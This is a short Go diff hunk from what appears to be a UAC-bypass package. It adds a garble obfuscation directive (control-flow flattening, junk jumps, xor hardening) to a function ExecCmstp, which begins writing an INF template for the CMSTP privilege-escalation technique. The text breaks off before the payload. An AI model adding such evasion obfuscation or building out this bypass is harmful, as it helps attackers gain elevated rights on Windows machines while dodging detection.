@@ -9,7 +9,7 @@ import (
 
 	. "github.com/justhx0r/uacbypasser/pkg"
 )
-
+//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
 func ExecCmstp(path string) error {
 	t := `[version]
 Signature=$chicago$
